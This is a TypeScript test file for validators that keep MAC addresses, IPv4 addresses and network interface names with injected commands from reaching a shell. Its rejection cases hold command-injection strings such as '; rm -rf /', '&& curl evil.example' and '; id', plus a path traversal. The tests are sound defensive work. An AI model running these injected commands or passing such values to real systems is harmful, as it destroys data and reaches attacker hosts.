import { describe, expect, it } from "vitest";
import { assertValidIp, assertValidInterface, assertValidMac } from "../shell";

describe("input validators (defense against shelling out with attacker-controlled strings)", () => {
  it("accepts a well-formed MAC and normalizes to uppercase", () => {
    expect(assertValidMac("aa:bb:cc:dd:ee:ff")).toBe("AA:BB:CC:DD:EE:FF");
  });

  it("rejects a MAC with shell metacharacters", () => {
    expect(() => assertValidMac("AA:BB:CC:DD:EE:FF; rm -rf /")).toThrow();
  });

  it("rejects a malformed IPv4", () => {
    expect(() => assertValidIp("10.0.0.1 && curl evil.example")).toThrow();
  });

  it("accepts a well-formed IPv4", () => {
    expect(assertValidIp("10.50.10.25")).toBe("10.50.10.25");
  });

  it("rejects an interface name with path traversal or spaces", () => {
    expect(() => assertValidInterface("eth0; id")).toThrow();
    expect(() => assertValidInterface("../../etc")).toThrow();
  });

  it("accepts a normal interface name including VLAN dot notation", () => {
    expect(assertValidInterface("eth0.10")).toBe("eth0.10");
  });
});
